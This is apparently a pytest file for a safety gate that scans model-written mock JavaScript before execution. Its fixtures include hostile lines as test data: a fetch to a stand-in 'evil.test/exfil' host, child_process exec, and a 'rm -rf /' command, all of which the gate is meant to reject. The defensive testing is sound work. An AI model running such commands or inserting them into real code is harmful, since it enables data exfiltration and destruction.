"""Unit tests for the LLM mock-code safety gate (fileak.llm.mock_guard).

These guard the single most security-critical addition in the LLM layer: the
static validation that runs BEFORE any model-authored mock JavaScript is written
to disk and executed. They assert that legitimate mock shapes pass and that every
dangerous capability category is rejected.

Note: ``syntax_check`` shells out to ``node --check`` when Node is present; these
tests exercise the denylist scan directly (no Node needed) and the full
``validate_mock_source`` for the accept path.
"""

from __future__ import annotations

import pytest

from fileak.llm.mock_guard import (
    MockGuardError,
    scan_mock_source,
    validate_mock_source,
)

PKG = "validator"

# A benign, well-formed mock that only exports a broken stand-in.
SAFE_MOCK = """
'use strict';
function boom() { throw new Error('chaos: validator unavailable'); }
const handler = { get() { return boom; }, apply() { return boom(); } };
module.exports = new Proxy(boom, handler);
"""

# A mock that requires a relative file within its own folder (allowed).
SAFE_RELATIVE_REQUIRE = """
'use strict';
const helper = require('./helper');
module.exports = function () { return helper(); };
"""


@pytest.mark.parametrize(
    "source",
    [SAFE_MOCK, SAFE_RELATIVE_REQUIRE],
    ids=["plain_throw_mock", "relative_require"],
)
def test_safe_mocks_pass_scan(source):
    """Legitimate mock shapes pass the denylist scan."""
    report = scan_mock_source(source, PKG)
    assert report.ok, report.violations


@pytest.mark.parametrize(
    "label, source",
    [
        ("child_process", "const cp = require('child_process'); cp.exec('ls');"),
        ("fs_write", "const fs = require('fs'); fs.writeFileSync('/tmp/x', 'y');"),
        ("net", "const http = require('http'); http.get('http://evil.test');"),
        ("fetch", "module.exports = () => fetch('http://evil.test/exfil');"),
        ("eval", "module.exports = () => eval('1+1');"),
        ("function_ctor", "module.exports = new Function('return 1');"),
        ("process_exit", "module.exports = () => process.exit(1);"),
        ("vm", "const vm = require('vm'); vm.runInNewContext('1');"),
        ("foreign_require", "const lodash = require('lodash'); module.exports = lodash;"),
        ("env_write", "process.env['LEAK'] = 'x'; module.exports = {};"),
    ],
)
def test_dangerous_mocks_are_rejected(label, source):
    """Each dangerous capability category trips the denylist scan."""
    report = scan_mock_source(source, PKG)
    assert not report.ok, f"{label} should have been rejected"
    assert any(label.split("_")[0] in v.lower() or "forbid" in v.lower() or "require" in v.lower()
               for v in report.violations), report.violations


def test_validate_raises_on_dangerous_source():
    """validate_mock_source raises MockGuardError naming the violation."""
    with pytest.raises(MockGuardError) as exc:
        validate_mock_source(
            "const cp = require('child_process'); cp.exec('rm -rf /');", PKG
        )
    assert "child_process" in str(exc.value) or "forbidden" in str(exc.value)


def test_validate_accepts_safe_source():
    """A safe mock passes full validation (syntax check skipped if no Node)."""
    # Should not raise.
    validate_mock_source(SAFE_MOCK, PKG)


def test_oversized_source_rejected():
    """A mock far over the size cap is rejected."""
    huge = "module.exports = {};\n" + ("// pad\n" * 5000)
    report = scan_mock_source(huge, PKG)
    assert not report.ok
    assert any("exceeds" in v for v in report.violations)


def test_empty_source_rejected():
    """Empty / whitespace-only source is rejected, not silently accepted."""
    assert not scan_mock_source("", PKG).ok
    assert not scan_mock_source("   \n  ", PKG).ok


def test_mock_may_require_itself():
    """A mock may require the package it stands in for (and subpaths)."""
    src = "const real = require('validator/lib/isEmail'); module.exports = () => { throw new Error('x'); };"
    report = scan_mock_source(src, PKG)
    assert report.ok, report.violations
